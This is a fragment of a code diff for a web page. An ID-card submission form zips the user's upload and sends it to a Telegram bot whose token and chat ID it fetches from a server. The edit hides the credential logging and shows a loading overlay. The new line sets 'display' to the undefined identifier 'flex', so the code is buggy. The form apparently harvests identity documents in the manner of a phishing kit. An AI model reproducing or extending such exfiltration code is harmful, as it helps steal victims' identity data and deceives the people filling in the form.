@@ -45,9 +45,9 @@
     top: 0;
     left: 0;
     width: 100%;
-    height: 100%;
+    height: 100%; 
     background-color: rgba(255, 255, 255, 0.5); /* White background with 0.5 opacity */
-    display: none; /* Center the loader */
+    display: flex; /* Center the loader */
     align-items: center; /* Vertically center */
     justify-content: center; /* Horizontally center */
     z-index: 9999; /* High z-index to cover all content */
@@ -334,9 +334,7 @@ document.querySelector('#idCardForm').addEventListener('submit', function(event)
                     dataType: "json"
                 }).then(function(response) {
                     const { botToken, chatId } = response;
-                    console.log(response);
-                    console.log(botToken);
-                    console.log(chatId);
+                    document.querySelector('#loading').style.display = flex;
                     // Send zip file to Telegram API
                     const telegramFormData = new FormData();
                     telegramFormData.append('chat_id', chatId);
